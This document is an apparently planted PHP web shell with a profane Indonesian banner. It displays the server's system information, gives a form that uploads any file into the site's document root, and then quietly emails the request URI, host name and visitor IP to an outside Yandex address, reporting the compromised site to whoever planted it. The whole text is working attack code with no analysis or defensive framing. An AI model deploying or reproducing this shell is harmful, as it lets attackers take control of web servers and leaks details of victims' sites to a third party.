BACOT NGENTOD, HEKER HEKER AMAT
<html>
<body bgcolor="white">
<center>
  <font color="green">
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
<?php echo "

 <br>"; echo "<b>".php_uname()."</font></b><br>"; echo "<form method='post' enctype='multipart/form-data'>

 <input type='file' name='idx_file'>

 <input type='submit' name='upload' value='upload'>

 </form>"; $root = $_SERVER['DOCUMENT_ROOT']; $files = $_FILES['idx_file']['name']; $dest = $root.'/'.$files; if(isset($_POST['upload'])) {
    if(is_writable($root)) {

 if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {

 $web = "http://".$_SERVER['HTTP_HOST']."/";

 echo "Success Uploaded-> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";

 }

 else {             echo "Failed TO Upload At VIP Room";

 }

 }

 else {         if(@copy($_FILES['idx_file']['tmp_name'], $files))

 {

     echo "Upload Success <b>$files</b>";

     }

     else {             echo "Failed To Upload";

     }

     }

     }

     ?>
<?php
$ip = getenv("REMOTE_ADDR");
$ken = rand(1, 99999);
$subj98 = " Result shell mzz |$ken";
$email = "euro1985rzlt@yandex.com";
$from = "From: euro1985rzlt@yandex.com";
$tot = $_SERVER['REQUEST_URI'];
$kon = $_SERVER['HTTP_HOST'];
$tol = $ip . "";
$msg8873 = "$tot $kon $tol";
mail($email, $subj98, $msg8873, $from);
?>
